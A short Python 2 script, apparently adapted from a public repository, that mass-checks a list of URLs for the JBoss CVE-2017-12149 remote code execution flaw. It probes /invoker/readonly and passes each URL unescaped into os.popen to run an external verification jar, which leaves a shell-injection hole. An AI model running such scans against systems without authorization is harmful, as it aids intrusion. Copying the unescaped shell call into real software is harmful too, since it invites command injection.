#!/usr/bin/python
#coding:utf-8
#author:Ja0k
#referer:https://github.com/yunxu1/jboss-_CVE-2017-12149
import os,sys,requests
import urllib3
urllib3.disable_warnings()

#access http://*.*.*.*/invoker/readonly return 500
def url_Test(url):
    POC_url="/invoker/readonly"
    headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"}
    try:
        code=requests.get(url+POC_url,headers=headers,timeout=5,verify=False).status_code
        if code == int(500):
            print "%s/invoker/readonly maybe use HttpInvoker! \n" %url
            return True
    except requests.exceptions.ConnectionError, e:
        pass 

#POC RCE
def Poc_Test(url):  
    output=os.popen("java -jar verify_CVE-2017-12149.jar %s" %url) 
    if "vuln"in output.read():
        print "%s is  Vul-Jboss-cve-2017-12149! \n" %url


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Usage: %s urllist.txt \nurl-format:http://1.1.1.1:8080" %sys.argv[0]
        exit()
    for i in open(sys.argv[1],'r').readlines():
        url=i.strip()
        if  url_Test(url):
            Poc_Test(url)